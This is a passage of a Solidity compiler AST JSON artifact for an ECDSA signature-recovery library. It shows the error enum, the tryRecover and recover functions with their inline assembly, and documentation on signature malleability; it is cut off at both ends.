],"contractKind":"library","documentation":{"id":1634,"nodeType":"StructuredDocumentation","src":"138:205:4","text":" @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.\n These functions can be used to verify that a message was signed by the holder\n of the private keys of a given address."},"fullyImplemented":true,"id":1979,"linearizedBaseContracts":[1979],"name":"ECDSA","nameLocation":"352:5:4","nodeType":"ContractDefinition","nodes":[{"canonicalName":"ECDSA.RecoverError","id":1639,"members":[{"id":1635,"name":"NoError","nameLocation":"392:7:4","nodeType":"EnumValue","src":"392:7:4"},{"id":1636,"name":"InvalidSignature","nameLocation":"409:16:4","nodeType":"EnumValue","src":"409:16:4"},{"id":1637,"name":"InvalidSignatureLength","nameLocation":"435:22:4","nodeType":"EnumValue","src":"435:22:4"},{"id":1638,"name":"InvalidSignatureS","nameLocation":"467:17:4","nodeType":"EnumValue","src":"467:17:4"}],"name":"RecoverError","nameLocation":"369:12:4","nodeType":"EnumDefinition","src":"364:126:4"},{"documentation":{"id":1640,"nodeType":"StructuredDocumentation","src":"496:63:4","text":" @dev The signature derives the `address(0)`."},"errorSelector":"f645eedf","id":1642,"name":"ECDSAInvalidSignature","nameLocation":"570:21:4","nodeType":"ErrorDefinition","parameters":{"id":1641,"nodeType":"ParameterList","parameters":[],"src":"591:2:4"},"src":"564:30:4"},{"documentation":{"id":1643,"nodeType":"StructuredDocumentation","src":"600:60:4","text":" @dev The signature has an invalid length."},"errorSelector":"fce698f7","id":1647,"name":"ECDSAInvalidSignatureLength","nameLocation":"671:27:4","nodeType":"ErrorDefinition","parameters":{"id":1646,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1645,"mutability":"mutable","name":"length","nameLocation":"707:6:4","nodeType":"VariableDeclaration","scope":1647,"src":"699:14:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1644,"name":"uint256","nodeType":"ElementaryTypeName","src":"699:7:4","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"698:16:4"},"src":"665:50:4"},{"documentation":{"id":1648,"nodeType":"StructuredDocumentation","src":"721:85:4","text":" @dev The signature has an S value that is in the upper half order."},"errorSelector":"d78bce0c","id":1652,"name":"ECDSAInvalidSignatureS","nameLocation":"817:22:4","nodeType":"ErrorDefinition","parameters":{"id":1651,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1650,"mutability":"mutable","name":"s","nameLocation":"848:1:4","nodeType":"VariableDeclaration","scope":1652,"src":"840:9:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1649,"name":"bytes32","nodeType":"ElementaryTypeName","src":"840:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"839:11:4"},"src":"811:40:4"},{"body":{"id":1704,"nodeType":"Block","src":"2285:622:4","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1670,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1667,"name":"signature","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1657,"src":"2299:9:4","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1668,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2309:6:4","memberName":"length","nodeType":"MemberAccess","src":"2299:16:4","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"3635","id":1669,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2319:2:4","typeDescriptions":{"typeIdentifier":"t_rational_65_by_1","typeString":"int_const 65"},"value":"65"},"src":"2299:22:4","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":1702,"nodeType":"Block","src":"2793:108:4","statements":[{"expression":{"components":[{"arguments":[{"hexValue":"30","id":1691,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2823:1:4","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":1690,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2815:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1689,"name":"address","nodeType":"ElementaryTypeName","src":"2815:7:4","typeDescriptions":{}}},"id":1692,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2815:10:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"expression":{"id":1693,"name":"RecoverError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1639,"src":"2827:12:4","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_RecoverError_$1639_$","typeString":"type(enum ECDSA.RecoverError)"}},"id":1694,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"2840:22:4","memberName":"InvalidSignatureLength","nodeType":"MemberAccess","referencedDeclaration":1637,"src":"2827:35:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},{"arguments":[{"expression":{"id":1697,"name":"signature","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1657,"src":"2872:9:4","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1698,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2882:6:4","memberName":"length","nodeType":"MemberAccess","src":"2872:16:4","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1696,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2864:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes32_$","typeString":"type(bytes32)"},"typeName":{"id":1695,"name":"bytes32","nodeType":"ElementaryTypeName","src":"2864:7:4","typeDescriptions":{}}},"id":1699,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2864:25:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"id":1700,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"2814:76:4","typeDescriptions":{"typeIdentifier":"t_tuple$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"tuple(address,enum ECDSA.RecoverError,bytes32)"}},"functionReturnParameters":1666,"id":1701,"nodeType":"Return","src":"2807:83:4"}]},"id":1703,"nodeType":"IfStatement","src":"2295:606:4","trueBody":{"id":1688,"nodeType":"Block","src":"2323:464:4","statements":[{"assignments":[1672],"declarations":[{"constant":false,"id":1672,"mutability":"mutable","name":"r","nameLocation":"2345:1:4","nodeType":"VariableDeclaration","scope":1688,"src":"2337:9:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1671,"name":"bytes32","nodeType":"ElementaryTypeName","src":"2337:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"id":1673,"nodeType":"VariableDeclarationStatement","src":"2337:9:4"},{"assignments":[1675],"declarations":[{"constant":false,"id":1675,"mutability":"mutable","name":"s","nameLocation":"2368:1:4","nodeType":"VariableDeclaration","scope":1688,"src":"2360:9:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1674,"name":"bytes32","nodeType":"ElementaryTypeName","src":"2360:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"id":1676,"nodeType":"VariableDeclarationStatement","src":"2360:9:4"},{"assignments":[1678],"declarations":[{"constant":false,"id":1678,"mutability":"mutable","name":"v","nameLocation":"2389:1:4","nodeType":"VariableDeclaration","scope":1688,"src":"2383:7:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":1677,"name":"uint8","nodeType":"ElementaryTypeName","src":"2383:5:4","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"}],"id":1679,"nodeType":"VariableDeclarationStatement","src":"2383:7:4"},{"AST":{"nativeSrc":"2560:171:4","nodeType":"YulBlock","src":"2560:171:4","statements":[{"nativeSrc":"2578:32:4","nodeType":"YulAssignment","src":"2578:32:4","value":{"arguments":[{"arguments":[{"name":"signature","nativeSrc":"2593:9:4","nodeType":"YulIdentifier","src":"2593:9:4"},{"kind":"number","nativeSrc":"2604:4:4","nodeType":"YulLiteral","src":"2604:4:4","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"2589:3:4","nodeType":"YulIdentifier","src":"2589:3:4"},"nativeSrc":"2589:20:4","nodeType":"YulFunctionCall","src":"2589:20:4"}],"functionName":{"name":"mload","nativeSrc":"2583:5:4","nodeType":"YulIdentifier","src":"2583:5:4"},"nativeSrc":"2583:27:4","nodeType":"YulFunctionCall","src":"2583:27:4"},"variableNames":[{"name":"r","nativeSrc":"2578:1:4","nodeType":"YulIdentifier","src":"2578:1:4"}]},{"nativeSrc":"2627:32:4","nodeType":"YulAssignment","src":"2627:32:4","value":{"arguments":[{"arguments":[{"name":"signature","nativeSrc":"2642:9:4","nodeType":"YulIdentifier","src":"2642:9:4"},{"kind":"number","nativeSrc":"2653:4:4","nodeType":"YulLiteral","src":"2653:4:4","type":"","value":"0x40"}],"functionName":{"name":"add","nativeSrc":"2638:3:4","nodeType":"YulIdentifier","src":"2638:3:4"},"nativeSrc":"2638:20:4","nodeType":"YulFunctionCall","src":"2638:20:4"}],"functionName":{"name":"mload","nativeSrc":"2632:5:4","nodeType":"YulIdentifier","src":"2632:5:4"},"nativeSrc":"2632:27:4","nodeType":"YulFunctionCall","src":"2632:27:4"},"variableNames":[{"name":"s","nativeSrc":"2627:1:4","nodeType":"YulIdentifier","src":"2627:1:4"}]},{"nativeSrc":"2676:41:4","nodeType":"YulAssignment","src":"2676:41:4","value":{"arguments":[{"kind":"number","nativeSrc":"2686:1:4","nodeType":"YulLiteral","src":"2686:1:4","type":"","value":"0"},{"arguments":[{"arguments":[{"name":"signature","nativeSrc":"2699:9:4","nodeType":"YulIdentifier","src":"2699:9:4"},{"kind":"number","nativeSrc":"2710:4:4","nodeType":"YulLiteral","src":"2710:4:4","type":"","value":"0x60"}],"functionName":{"name":"add","nativeSrc":"2695:3:4","nodeType":"YulIdentifier","src":"2695:3:4"},"nativeSrc":"2695:20:4","nodeType":"YulFunctionCall","src":"2695:20:4"}],"functionName":{"name":"mload","nativeSrc":"2689:5:4","nodeType":"YulIdentifier","src":"2689:5:4"},"nativeSrc":"2689:27:4","nodeType":"YulFunctionCall","src":"2689:27:4"}],"functionName":{"name":"byte","nativeSrc":"2681:4:4","nodeType":"YulIdentifier","src":"2681:4:4"},"nativeSrc":"2681:36:4","nodeType":"YulFunctionCall","src":"2681:36:4"},"variableNames":[{"name":"v","nativeSrc":"2676:1:4","nodeType":"YulIdentifier","src":"2676:1:4"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":1672,"isOffset":false,"isSlot":false,"src":"2578:1:4","valueSize":1},{"declaration":1675,"isOffset":false,"isSlot":false,"src":"2627:1:4","valueSize":1},{"declaration":1657,"isOffset":false,"isSlot":false,"src":"2593:9:4","valueSize":1},{"declaration":1657,"isOffset":false,"isSlot":false,"src":"2642:9:4","valueSize":1},{"declaration":1657,"isOffset":false,"isSlot":false,"src":"2699:9:4","valueSize":1},{"declaration":1678,"isOffset":false,"isSlot":false,"src":"2676:1:4","valueSize":1}],"flags":["memory-safe"],"id":1680,"nodeType":"InlineAssembly","src":"2535:196:4"},{"expression":{"arguments":[{"id":1682,"name":"hash","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1655,"src":"2762:4:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1683,"name":"v","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1678,"src":"2768:1:4","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},{"id":1684,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1672,"src":"2771:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1685,"name":"s","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1675,"src":"2774:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_uint8","typeString":"uint8"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1681,"name":"tryRecover","nodeType":"Identifier","overloadedDeclarations":[1705,1785,1893],"referencedDeclaration":1893,"src":"2751:10:4","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes32_$_t_uint8_$_t_bytes32_$_t_bytes32_$returns$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"function (bytes32,uint8,bytes32,bytes32) pure returns (address,enum ECDSA.RecoverError,bytes32)"}},"id":1686,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2751:25:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"tuple(address,enum ECDSA.RecoverError,bytes32)"}},"functionReturnParameters":1666,"id":1687,"nodeType":"Return","src":"2744:32:4"}]}}]},"documentation":{"id":1653,"nodeType":"StructuredDocumentation","src":"857:1267:4","text":" @dev Returns the address that signed a hashed message (`hash`) with `signature` or an error. This will not\n return address(0) without also returning an error description. Errors are documented using an enum (error type)\n and a bytes32 providing additional information about the error.\n If no error is returned, then the address can be used for verification purposes.\n The `ecrecover` EVM precompile allows for malleable (non-unique) signatures:\n this function rejects them by requiring the `s` value to be in the lower\n half order, and the `v` value to be either 27 or 28.\n IMPORTANT: `hash` _must_ be the result of a hash operation for the\n verification to be secure: it is possible to craft signatures that\n recover to arbitrary addresses for non-hashed data. A safe way to ensure\n this is by receiving a hash of the original message (which may otherwise\n be too long), and then calling {MessageHashUtils-toEthSignedMessageHash} on it.\n Documentation for signature generation:\n - with https://web3js.readthedocs.io/en/v1.3.4/web3-eth-accounts.html#sign[Web3.js]\n - with https://docs.ethers.io/v5/api/signer/#Signer-signMessage[ethers]"},"id":1705,"implemented":true,"kind":"function","modifiers":[],"name":"tryRecover","nameLocation":"2138:10:4","nodeType":"FunctionDefinition","parameters":{"id":1658,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1655,"mutability":"mutable","name":"hash","nameLocation":"2166:4:4","nodeType":"VariableDeclaration","scope":1705,"src":"2158:12:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1654,"name":"bytes32","nodeType":"ElementaryTypeName","src":"2158:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":1657,"mutability":"mutable","name":"signature","nameLocation":"2193:9:4","nodeType":"VariableDeclaration","scope":1705,"src":"2180:22:4","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1656,"name":"bytes","nodeType":"ElementaryTypeName","src":"2180:5:4","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"2148:60:4"},"returnParameters":{"id":1666,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1660,"mutability":"mutable","name":"recovered","nameLocation":"2240:9:4","nodeType":"VariableDeclaration","scope":1705,"src":"2232:17:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1659,"name":"address","nodeType":"ElementaryTypeName","src":"2232:7:4","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1663,"mutability":"mutable","name":"err","nameLocation":"2264:3:4","nodeType":"VariableDeclaration","scope":1705,"src":"2251:16:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"typeName":{"id":1662,"nodeType":"UserDefinedTypeName","pathNode":{"id":1661,"name":"RecoverError","nameLocations":["2251:12:4"],"nodeType":"IdentifierPath","referencedDeclaration":1639,"src":"2251:12:4"},"referencedDeclaration":1639,"src":"2251:12:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"visibility":"internal"},{"constant":false,"id":1665,"mutability":"mutable","name":"errArg","nameLocation":"2277:6:4","nodeType":"VariableDeclaration","scope":1705,"src":"2269:14:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1664,"name":"bytes32","nodeType":"ElementaryTypeName","src":"2269:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"2231:53:4"},"scope":1979,"src":"2129:778:4","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1734,"nodeType":"Block","src":"3801:168:4","statements":[{"assignments":[1716,1719,1721],"declarations":[{"constant":false,"id":1716,"mutability":"mutable","name":"recovered","nameLocation":"3820:9:4","nodeType":"VariableDeclaration","scope":1734,"src":"3812:17:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1715,"name":"address","nodeType":"ElementaryTypeName","src":"3812:7:4","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1719,"mutability":"mutable","name":"error","nameLocation":"3844:5:4","nodeType":"VariableDeclaration","scope":1734,"src":"3831:18:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"typeName":{"id":1718,"nodeType":"UserDefinedTypeName","pathNode":{"id":1717,"name":"RecoverError","nameLocations":["3831:12:4"],"nodeType":"IdentifierPath","referencedDeclaration":1639,"src":"3831:12:4"},"referencedDeclaration":1639,"src":"3831:12:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"visibility":"internal"},{"constant":false,"id":1721,"mutability":"mutable","name":"errorArg","nameLocation":"3859:8:4","nodeType":"VariableDeclaration","scope":1734,"src":"3851:16:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1720,"name":"bytes32","nodeType":"ElementaryTypeName","src":"3851:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"id":1726,"initialValue":{"arguments":[{"id":1723,"name":"hash","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1708,"src":"3882:4:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1724,"name":"signature","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1710,"src":"3888:9:4","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":1722,"name":"tryRecover","nodeType":"Identifier","overloadedDeclarations":[1705,1785,1893],"referencedDeclaration":1705,"src":"3871:10:4","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes32_$_t_bytes_memory_ptr_$returns$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"function (bytes32,bytes memory) pure returns (address,enum ECDSA.RecoverError,bytes32)"}},"id":1725,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3871:27:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"tuple(address,enum ECDSA.RecoverError,bytes32)"}},"nodeType":"VariableDeclarationStatement","src":"3811:87:4"},{"expression":{"arguments":[{"id":1728,"name":"error","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1719,"src":"3920:5:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},{"id":1729,"name":"errorArg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1721,"src":"3927:8:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1727,"name":"_throwError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1978,"src":"3908:11:4","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_enum$_RecoverError_$1639_$_t_bytes32_$returns$__$","typeString":"function (enum ECDSA.RecoverError,bytes32) pure"}},"id":1730,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3908:28:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1731,"nodeType":"ExpressionStatement","src":"3908:28:4"},{"expression":{"id":1732,"name":"recovered","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1716,"src":"3953:9:4","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":1714,"id":1733,"nodeType":"Return","src":"3946:16:4"}]},"documentation":{"id":1706,"nodeType":"StructuredDocumentation","src":"2913:796:4","text":" @dev Returns the address that signed a hashed message (`hash`) with\n `signature`. This address can then be used for verification purposes.\n The `ecrecover` EVM precompile allows for malleable (non-unique) signatures:\n this function rejects them by requiring the `s` value to be in the lower\n half order, and the `v` value to be either 27 or 28.\n IMPORTANT: `hash` _must_ be the result of a hash operation for the\n verification to be secure: it is possible to craft signatures that\n recover to arbitrary addresses for non-hashed data. A safe way to ensure\n this is by receiving a hash of the original message (which may otherwise\n be too long), and then calling {MessageHashUtils-toEthSignedMessageHash} on it."},"id":1735,"implemented":true,"kind":"function","modifiers":[],"name":"recover","nameLocation":"3723:7:4","nodeType":"FunctionDefinition","parameters":{"id":1711,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1708,"mutability":"mutable","name":"hash","nameLocation":"3739:4:4","nodeType":"VariableDeclaration","scope":1735,"src":"3731:12:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1707,"name":"bytes32","nodeType":"ElementaryTypeName","src":"3731:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":1710,"mutability":"mutable","name":"signature","nameLocation":"3758:9:4","nodeType":"VariableDeclaration","scope":1735,"src":"3745:22:4","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1709,"name":"bytes","nodeType":"ElementaryTypeName","src":"3745:5:4","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"3730:38:4"},"returnParameters":{"id":1714,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1713,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1735,"src":"3792:7:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1712,"name":"address","nodeType":"ElementaryTypeName","src":"3792:7:4","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"3791:9:4"},"scope":1979,"src":"3714:255:4","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1784,"nodeType":"Block","src":"4348:342:4","statements":[{"id":1783,"nodeType":"UncheckedBlock","src":"4358:326:4","statements":[{"assignments":[1753],"declarations":[{"constant":false,"id":1753,"mutability":"mutable","name":"s","nameLocation":"4390:1:4","nodeType":"VariableDeclaration","scope":1783,"src":"4382:9:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1752,"name":"bytes32","nodeType":"ElementaryTypeName","src":"4382:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"id":1760,"initialValue":{"commonType":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"id":1759,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1754,"name":"vs","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1742,"src":"4394:2:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"arguments":[{"hexValue":"307837666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666","id":1757,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4407:66:4","typeDescriptions":{"typeIdentifier":"t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819967_by_1","typeString":"int_const 5789...(69 digits omitted)...9967"},"value":"0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819967_by_1","typeString":"int_const 5789...(69 digits omitted)...9967"}],"id":1756,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4399:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes32_$","typeString":"type(bytes32)"},"typeName":{"id":1755,"name":"bytes32","nodeType":"ElementaryTypeName","src":"4399:7:4","typeDescriptions":{}}},"id":1758,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4399:75:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"src":"4394:80:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"nodeType":"VariableDeclarationStatement","src":"4382:92:4"},{"assignments":[1762],"declarations":[{"constant":false,"id":1762,"mutability":"mutable","name":"v","nameLocation":"4591:1:4","nodeType":"VariableDeclaration","scope":1783,"src":"4585:7:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":1761,"name":"uint8","nodeType":"ElementaryTypeName","src":"4585:5:4","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"}],"id":1775,"initialValue":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1773,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1770,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":1767,"name":"vs","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1742,"src":"4610:2:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1766,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4602:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":1765,"name":"uint256","nodeType":"ElementaryTypeName","src":"4602:7:4","typeDescriptions":{}}},"id":1768,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4602:11:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"323535","id":1769,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4617:3:4","typeDescriptions":{"typeIdentifier":"t_rational_255_by_1","typeString":"int_const 